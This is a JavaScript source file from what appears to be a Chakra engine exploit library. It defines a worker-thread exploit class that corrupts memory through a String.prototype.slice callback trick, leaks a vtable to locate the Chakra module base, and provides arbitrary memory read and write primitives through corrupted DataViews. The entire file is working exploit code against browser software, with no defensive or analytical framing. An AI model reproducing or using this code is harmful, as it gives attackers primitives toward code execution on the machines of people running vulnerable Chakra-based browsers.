import ChakraExploit from "chakraexploit";
import Integer from "integer";

/**
 * Constructs an exploit class for a worker script. Used in concert with {@link ChakraExploit#Thread} to support multithreading.
 *
 * @augments ChakraExploit
 * @class
 * @constructor
 */
function ChakraThreadExploit() {
    ChakraExploit.call(this);

    var dvManager = new DataView(new ArrayBuffer(0x1000));
    var dvWorker = new DataView(new ArrayBuffer(0x1000));
    this.dvWorker = dvWorker;
    this.dvManager = dvManager;

    eval('String.prototype.slice').call('', {
        valueOf: function () {
            postMessage('CHAKRA_EXPLOIT');
            while (dvWorker.getInt32(0) == 0) {};
        }
    }, 0, 0, 0, 0, 0x41424344, dvWorker, dvManager, 0x41414141);
    
    var vtable = new Integer(dvManager.getInt32(0, true), dvManager.getInt32(4, true));
    this.vtable = vtable;
    this.chakraBase = this.findModuleBase(vtable);
    this.initChakra(vtable);
}
ChakraThreadExploit.prototype = Object.create(ChakraExploit.prototype);
ChakraThreadExploit.prototype.constructor = ChakraThreadExploit;
/**
 * Arbitrary memory read using corrupted DataView.
 *
 * @param {Integer} address Memory address
 * @param {integer} size Bit size
 * @returns {Integer}
 */
ChakraThreadExploit.prototype.read = function (address, size) {
    this.dvManager.setInt32(7 * 8, address.low, true);
    this.dvManager.setInt32(7 * 8 + 4, address.high, true);

    switch (size) {
        case 8: return new Integer(this.dvWorker.getInt8(0, true), 0, true);
        case 16: return new Integer(this.dvWorker.getInt16(0, true), 0, true);
        case 32: return new Integer(this.dvWorker.getInt32(0, true), 0, true);
        case 64: return new Integer(this.dvWorker.getInt32(0, true), this.dvWorker.getInt32(4, true), true);
    }
}
/**
 * Arbitrary memory write using corrupted DataView.
 *
 * @param {Integer} address Memory address
 * @param {Integer} value Value to write
 * @param {integer} size Bit size
 */
ChakraThreadExploit.prototype.write = function (address, value, size) {
    this.dvManager.setInt32(7 * 8, address.low, true);
    this.dvManager.setInt32(7 * 8 + 4, address.high, true);

    switch (size) {
        case 8: return this.dvWorker.setInt8(0, value.low|0, true);
        case 16: return this.dvWorker.setInt16(0, value.low|0, true);
        case 32: return this.dvWorker.setInt32(0, value.low|0, true);
        case 64:
            this.dvWorker.setInt32(0, value.low|0, true);
            this.dvWorker.setInt32(4, value.high|0, true);
    }
}

export default ChakraThreadExploit;
